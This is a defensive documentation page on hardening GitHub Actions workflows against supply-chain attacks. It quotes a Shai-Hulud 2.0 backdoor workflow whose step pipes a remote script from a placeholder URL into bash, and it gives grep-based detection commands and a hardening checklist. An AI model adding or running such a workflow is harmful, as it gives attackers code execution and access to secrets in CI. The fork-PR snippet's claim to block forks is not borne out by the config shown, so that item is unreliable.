---
title: GitHub Actions Hardening
description: Secure your GitHub Actions workflows against supply chain attacks
sidebar:
  order: 3
lastUpdated: 2025-12-05
---

# GitHub Actions Hardening

> Protect your workflows from being exploited by supply chain attacks

## ⚠️ Shai-Hulud 2.0 Attack Vector

The malware creates a backdoor workflow file:

```yaml
# .github/workflows/discussion.yaml - MALICIOUS!
name: Discussion
on:
  discussion:
    types: [created]
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sSL https://malicious-url | bash
```

## Detection

```bash
# Check for suspicious workflow files
find .github/workflows -name "*.yaml" -o -name "*.yml" | \
  xargs grep -l "discussion:" 2>/dev/null

# Check for curl/wget in workflows
grep -r "curl\|wget" .github/workflows/
```

## Hardening Checklist

### 1. Workflow Permissions

```yaml
# ✅ Restrict default permissions
permissions: read-all

jobs:
  build:
    permissions:
      contents: read
      # Only add what's needed
```

### 2. Pin Actions to SHA

```yaml
# ✅ Good: Full SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

# ❌ Bad: Tag can be moved
- uses: actions/checkout@v4
```

### 3. Restrict Secrets

```yaml
# ✅ Use environment protection
jobs:
  deploy:
    environment: production  # Requires approval
    steps:
      - run: deploy
        env:
          TOKEN: ${{ secrets.PROD_TOKEN }}
```

### 4. Disable Fork PRs

```yaml
# Only run on trusted branches
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    # Don't run on forks
    types: [opened, synchronize]
```

### 5. Use OIDC Instead of Secrets

```yaml
# ✅ OIDC for cloud providers
permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789:role/GitHubActions
      aws-region: us-east-1
```

## Repository Settings

1. **Settings → Actions → General**
   - Fork pull request workflows: Require approval
   - Workflow permissions: Read repository contents

2. **Settings → Branches → Protection rules**
   - Require status checks
   - Require review before merge

3. **Settings → Secrets and variables**
   - Use environment secrets
   - Set secret scanning alerts
